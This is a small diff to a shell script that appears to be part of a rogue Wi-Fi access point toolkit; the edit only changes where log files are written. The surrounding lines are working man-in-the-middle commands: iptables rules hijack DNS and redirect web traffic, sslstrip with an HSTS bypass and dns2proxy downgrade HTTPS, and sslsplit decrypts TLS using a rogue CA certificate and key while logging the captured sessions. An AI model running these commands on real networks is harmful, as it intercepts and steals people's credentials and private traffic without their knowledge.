@@ -42,13 +42,13 @@ iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
 
 #SSLStrip with HSTS bypass
 cd ../sslstrip-hsts/
-python sslstrip.py -l 10000 -a -w sslstrip.log&
+python sslstrip.py -l 10000 -a -w /captures/mana/sslstrip.log&
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 python dns2proxy.py $phy&
 cd -
 
 #SSLSplit
-sslsplit -D -P -Z -S sslsplit -c cert/rogue-ca.pem -k cert/rogue-ca.key -O -l sslsplit-connect.log \
+sslsplit -D -P -Z -S sslsplit -c cert/rogue-ca.pem -k cert/rogue-ca.key -O -l /captures/mana/sslsplit-connect.log \
  https 0.0.0.0 10443 \
  http 0.0.0.0 10080 \
  ssl 0.0.0.0 10993 \
